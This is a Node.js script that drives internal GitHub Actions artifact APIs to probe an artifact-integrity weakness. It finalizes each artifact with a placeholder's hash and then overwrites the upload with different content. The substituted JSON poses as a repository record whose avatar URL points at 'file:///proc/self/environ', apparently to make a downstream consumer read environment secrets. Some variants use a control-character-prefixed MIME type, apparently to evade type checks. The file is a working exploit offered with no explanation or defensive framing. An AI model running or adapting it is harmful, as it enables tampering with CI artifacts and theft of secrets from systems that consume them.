import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const placeholder = Buffer.from('{"probe":"direct"}');
const placeholderHash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const odd = '\u0085application/json';
const repo = process.env.GITHUB_REPOSITORY;

async function upload(url, bytes, mime) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: mime},
  });
  return true;
}
async function run(config, index) {
  const name = `direct-${process.env.GITHUB_RUN_ID}-${index}-${config.label}`;
  const created = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version: config.version,
    mimeType: StringValue.create({value: config.mime}),
  });
  if (!created.ok) throw new Error('create failed');
  await upload(created.signedUploadUrl, placeholder, config.mime);
  const finalized = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(placeholder.length),
    hash: StringValue.create({value: placeholderHash}),
  });
  const id = String(finalized.artifactId);
  const repository = `${repo}/actions/artifacts/${id}/zip`;
  const carrier = Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: `Repo Cassette direct ${config.label}`,
    stargazers_count: 0,
  }));
  await upload(created.signedUploadUrl, carrier, config.mime);
  console.log(`DIRECT ${JSON.stringify({id, name, version: config.version, mime: config.mime, repository, expectedBytes: carrier.length})}`);
}

const configs = [
  {version: 7, mime: odd, label: 'v7odd'},
  {version: 6, mime: odd, label: 'v6odd'},
  {version: 7, mime: 'application/json', label: 'v7json'},
  {version: 6, mime: 'application/json', label: 'v6json'},
];
for (let i = 0; i < configs.length; i++) {
  try { await run(configs[i], i); } catch (error) { console.log(`DIRECT-ERROR ${i} ${String(error).slice(0,200)}`); }
}
